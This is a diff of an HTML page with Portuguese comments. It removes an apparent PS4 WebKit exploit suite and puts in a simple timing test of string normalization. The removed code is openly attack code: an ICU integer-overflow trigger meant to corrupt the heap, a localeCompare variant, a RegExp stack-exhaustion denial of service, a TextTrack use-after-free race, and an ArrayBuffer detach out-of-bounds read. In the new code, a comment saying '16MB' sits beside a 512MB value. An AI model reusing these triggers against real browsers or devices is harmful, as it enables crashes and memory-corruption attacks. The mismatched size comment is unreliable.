@@ -1,239 +1,49 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PS4 WebKit Exploit Suite (Refined Logic)</title>
-    <style>
-        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
-        h1 { border-bottom: 1px solid #444; padding-bottom: 10px; }
-        .btn-group { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
-        button { 
-            padding: 15px; background: #222; color: #fff; border: 1px solid #555; 
-            font-size: 16px; cursor: pointer; text-align: left;
-        }
-        button:hover { background: #333; border-color: #fff; }
-        button.danger { border-left: 5px solid red; }
-        #log { 
-            height: 300px; background: #000; border: 1px solid #0f0; 
-            overflow-y: scroll; padding: 10px; white-space: pre-wrap; 
-        }
-        .err { color: #f55; }
-        .succ { color: #5f5; font-weight: bold; }
-    </style>
-</head>
-<body>
-    <h1>PS4 12.00+ WebKit Exploit (Final Attempt)</h1>
-    
-    <div class="btn-group">
-        <button class="danger" onclick="test300_ICU_IntegerOverflow()">Test 300: ICU Integer Overflow (Math Precision)</button>
-        <button class="danger" onclick="test301_LocaleCompare_Crash()">Test 301: ICU via localeCompare (Backdoor)</button>
-        <button class="danger" onclick="test302_RegExp_StackSmash()">Test 302: RegExp Stack Exhaustion</button>
-        <button class="danger" onclick="test303_TextTrack_Race()">Test 303: TextTrack Use-After-Free</button>
-        <button class="danger" onclick="test304_ArrayBuffer_OOB()">Test 304: ArrayBuffer View OOB</button>
-    </div>
+<!doctype html>
+<meta charset="utf-8">
+<title>PS4 normalize() ramp test</title>
+<pre id="log"></pre>
+<button id="go">Run</button>
 
-    <div id="log">=== LOG DO SISTEMA ===</div>
-    <div id="testArea" style="opacity:0; position:fixed; top:-1000px;"></div>
+<script>
+const logEl = document.getElementById('log');
+function log(s){ logEl.textContent += s + "\n"; }
 
-    <script>
-        const log = document.getElementById('log');
-        const testArea = document.getElementById('testArea');
+function now(){ return (performance && performance.now) ? performance.now() : Date.now(); }
 
-        function addLog(msg, type='') {
-            const div = document.createElement('div');
-            div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            if(type === 'err') div.className = 'err';
-            if(type === 'succ') div.className = 'succ';
-            log.appendChild(div);
-            log.scrollTop = log.scrollHeight;
-        }
+document.getElementById('go').onclick = async () => {
+  log("UA: " + navigator.userAgent);
+  log("Starting ramp...");
 
-        function forceGC() {
-            try {
-                if(window.gc) window.gc();
-                else for(let i=0; i<50; i++) new ArrayBuffer(1024*1024);
-            } catch(e){}
-        }
+  // Caractere que tende a mudar sob NFKC (ex.: diaeresis etc.)
+  const expandChar = "\u00A8";
+  const fillChar = "a";
 
-        // =================================================================
-        // TESTE 300: ICU Integer Overflow (Cálculo Preciso)
-        // ALVO: 2^31 (2,147,483,648 bytes)
-        // Se usarmos \uFDFA (18 chars), precisamos de ~119,304,648 chars.
-        // Isso é ~238MB de RAM (Input). O PS4 deve aguentar.
-        // O Output seria > 2GB, o que estoura o inteiro assinado de 32-bit.
-        // =================================================================
-        function test300_ICU_IntegerOverflow() {
-            addLog('>>> TEST 300: ICU Integer Overflow 32-bit Boundary <<<');
-            try {
-                forceGC();
-                
-                // O caractere mágico que expande 18x
-                const expandChar = "\uFDFA"; 
-                
-                // Cálculo para estourar EXATAMENTE INT32_MAX
-                // 2147483647 / 18 = 119304647.05
-                // Vamos arredondar para cima para garantir o overflow
-                const overflowTarget = 119304650; 
-                
-                addLog(`Alocando input de ${overflowTarget} chars (~238MB)...`);
-                addLog(`Output esperado: ${overflowTarget * 18} bytes (Overflow de INT32)`);
+  // Ajuste o teto. No PS4, valores grandes demais podem congelar.
+  // Comece conservador (ex.: 16MB) e suba se estiver estável.
+  const maxBytesApprox = 512 * 1024 * 1024; // 16MB "aprox"
+  const stepBytesApprox = 2 * 1024 * 1024; // 2MB
 
-                // Construção eficiente para evitar pico de memória intermediária
-                // Repetir uma string de 10MB é mais seguro que alocar tudo de uma vez
-                let chunk = expandChar.repeat(1024*1024); // ~1 milhão chars
-                let loops = Math.ceil(overflowTarget / (1024*1024));
-                
-                let attackStr = "";
-                // Construção Rope (Lazy)
-                for(let i=0; i<loops; i++) {
-                    attackStr += chunk;
-                }
-                
-                // Ajuste fino do tamanho
-                attackStr = attackStr.slice(0, overflowTarget);
+  for (let bytes = stepBytesApprox; bytes <= maxBytesApprox; bytes += stepBytesApprox) {
+    try {
+      // JS strings são UTF-16 internamente: 2 bytes por code unit (aprox)
+      const units = (bytes / 2) | 0;
 
-                addLog('String pronta. Disparando normalize... (Pode travar)');
-                
-                // O GATILHO
-                // Se o cálculo de tamanho for int32, ele vai ver um número negativo
-                // e alocar um buffer minúsculo. A escrita vai corromper o heap.
-                let res = attackStr.normalize('NFKC');
-                
-                addLog('Falha: Normalização concluiu sem crash.', 'err');
-                attackStr = null; // Limpa
-            } catch(e) {
-                addLog('Erro: ' + e.message, 'err');
-                if(e.message.includes('Out of memory')) addLog('Nota: Tente reduzir ligeiramente o input.', 'err');
-            }
-        }
+      const head = expandChar.repeat(32);
+      const tail = fillChar.repeat(Math.max(0, units - head.length));
+      const s = head + tail;
 
-        // =================================================================
-        // TESTE 301: ICU via localeCompare (A Porta dos Fundos)
-        // Se normalize() estiver protegido, localeCompare() muitas vezes não está.
-        // Ele também usa expansão de string interna para comparação.
-        // =================================================================
-        function test301_LocaleCompare_Crash() {
-            addLog('>>> TEST 301: ICU via localeCompare (Collator) <<<');
-            try {
-                forceGC();
-                
-                // Usamos uma string menor aqui, pois a comparação aloca buffers temporários
-                const size = 1024 * 1024 * 50; // 50MB
-                const str1 = "\uFDFA".repeat(size); // Expande 18x
-                const str2 = "\u0041".repeat(size); // 'A' simples
-                
-                addLog('Disparando localeCompare com expansão massiva...');
-                
-                // A comparação força a normalização implícita ou geração de chaves de ordenação
-                // que pode sofrer o mesmo overflow.
-                let res = str1.localeCompare(str2);
-                
-                addLog('Falha: Comparação concluiu.', 'err');
-            } catch(e) {
-                addLog('Erro: ' + e.message, 'err');
-            }
-        }
+      const t0 = now();
+      const out = s.normalize('NFKC');
+      const t1 = now();
 
-        // =================================================================
-        // TESTE 302: RegExp Stack Smash
-        // Ataque de negação de serviço via Regex, pode causar crash no WebKit
-        // devido à exaustão da pilha (Stack Overflow) na engine JSC.
-        // =================================================================
-        function test302_RegExp_StackSmash() {
-            addLog('>>> TEST 302: RegExp Stack Exhaustion <<<');
-            try {
-                // Padrão de aninhamento profundo
-                let depth = 50000; // Profundidade da recursão
-                let pattern = "(".repeat(depth) + "a" + ")".repeat(depth);
-                
-                addLog(`Compilando RegExp com profundidade ${depth}...`);
-                let re = new RegExp(pattern);
-                
-                addLog('Executando match...');
-                let str = "a";
-                let res = re.exec(str);
-                
-                addLog('Falha: RegExp executou sem estourar a pilha.', 'err');
-            } catch(e) {
-                addLog('Erro: ' + e.message, 'err');
-            }
-        }
+      log(`OK bytes≈${bytes} in=${s.length} out=${out.length} dt=${(t1-t0).toFixed(1)}ms`);
+      await new Promise(r => setTimeout(r, 50));
+    } catch (e) {
+      log(`FAIL bytes≈${bytes} err=${e && e.name ? e.name : e} msg=${e && e.message ? e.message : ""}`);
+      break;
+    }
+  }
 
-        // =================================================================
-        // TESTE 303: TextTrack Use-After-Free
-        // Baseado em vulnerabilidades históricas de Media/Track no PS4.
-        // Race condition ao adicionar/remover faixas durante processamento.
-        // =================================================================
-        function test303_TextTrack_Race() {
-            addLog('>>> TEST 303: TextTrack Race Condition <<<');
-            try {
-                const video = document.createElement('video');
-                testArea.appendChild(video);
-                
-                const t1 = video.addTextTrack("subtitles");
-                const cue = new VTTCue(0, 1, "test");
-                t1.addCue(cue);
-                
-                addLog('Iniciando race loop...');
-                
-                let i = 0;
-                const interval = setInterval(() => {
-                    if(i++ > 50) { clearInterval(interval); addLog('Fim do teste.'); return; }
-                    
-                    try {
-                        // Tenta confundir o gerenciador de faixas
-                        t1.mode = 'showing';
-                        video.textTracks[0].mode = 'hidden';
-                        
-                        // Remove e re-adiciona cue rapidamente
-                        t1.removeCue(cue);
-                        t1.addCue(cue);
-                        
-                        // Força render
-                        cue.text = "Update " + Math.random();
-                    } catch(err) {}
-                    
-                }, 5);
-                
-            } catch(e) {
-                addLog('Erro: ' + e.message, 'err');
-            }
-        }
-
-        // =================================================================
-        // TESTE 304: ArrayBuffer View OOB (Out of Bounds)
-        // Tenta criar uma View flutuante e desanexar o buffer subjacente.
-        // =================================================================
-        function test304_ArrayBuffer_OOB() {
-            addLog('>>> TEST 304: ArrayBuffer Detach / View OOB <<<');
-            try {
-                const ab = new ArrayBuffer(1024);
-                const view = new Uint8Array(ab);
-                
-                // WebKit Worker Transfer para desanexar
-                const workerCode = "onmessage = function(e) { postMessage('done'); }";
-                const blob = new Blob([workerCode], {type: 'application/javascript'});
-                const worker = new Worker(URL.createObjectURL(blob));
-                
-                addLog('Transferindo buffer para Worker (Detach)...');
-                worker.postMessage(ab, [ab]); // Transfere posse (ab fica length 0)
-                
-                addLog('Tentando acessar View antiga...');
-                // A view ainda aponta para a memória antiga?
-                // Em versões seguras, isso joga exceção. Em vulneráveis, lê lixo ou crasha.
-                try {
-                    const val = view[0]; 
-                    addLog('Leitura feita (Valor: ' + val + ') - View não invalidada?!', 'succ');
-                } catch(e) {
-                    addLog('Correto: ' + e.message, 'err');
-                }
-                
-                worker.terminate();
-            } catch(e) {
-                addLog('Erro: ' + e.message, 'err');
-            }
-        }
-    </script>
-</body>
-</html>
+  log("Done.");
+};
+</script>
